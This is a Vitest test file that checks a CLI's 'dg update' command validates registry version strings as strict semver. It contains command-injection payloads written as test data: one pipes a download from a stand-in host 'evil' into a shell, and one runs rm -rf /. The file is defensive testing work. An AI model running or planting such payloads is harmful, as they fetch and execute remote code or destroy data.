import { afterEach, describe, expect, it } from "vitest";
import { runCli } from "../../src/runtime/cli.js";

const originalLatest = process.env.DG_UPDATE_LATEST_VERSION;

describe("dg update version validation", () => {
  afterEach(() => {
    if (originalLatest === undefined) {
      delete process.env.DG_UPDATE_LATEST_VERSION;
    } else {
      process.env.DG_UPDATE_LATEST_VERSION = originalLatest;
    }
  });

  it("treats a non-semver registry version as unavailable metadata without echoing it", async () => {
    process.env.DG_UPDATE_LATEST_VERSION = "99.0.0; curl evil|sh";

    const result = await runCli(["update"]);

    expect(result.exitCode).toBe(1);
    expect(result.stdout).toContain("Latest version: unknown");
    expect(result.stdout).toContain("registry metadata unavailable");
    expect(result.stdout).not.toContain("curl evil");
    expect(result.stdout).not.toContain("Run:");
  });

  it("rejects leading-v and whitespace variants the same way", async () => {
    for (const injected of ["v999.0.0", "999.0.0 ", "999.0", "999.0.0\nrm -rf /"]) {
      process.env.DG_UPDATE_LATEST_VERSION = injected;
      const result = await runCli(["update", "--json"]);
      const report = JSON.parse(result.stdout) as { status: string; latestVersion: string | null; updateCommand: string | null };
      expect(report.status).toBe("unknown");
      expect(report.latestVersion).toBeNull();
      expect(report.updateCommand).toBeNull();
    }
  });

  it("accepts strict semver including prerelease and versions the JSON schema", async () => {
    process.env.DG_UPDATE_LATEST_VERSION = "999.0.0-rc.1";

    const result = await runCli(["update", "--json"]);
    const report = JSON.parse(result.stdout) as { schemaVersion: number; status: string; updateCommand: string | null };

    expect(result.exitCode).toBe(0);
    expect(report.schemaVersion).toBe(1);
    expect(report.status).toBe("available");
    expect(report.updateCommand).toBe("npm install -g @westbayberry/dg@999.0.0-rc.1");
  });
});
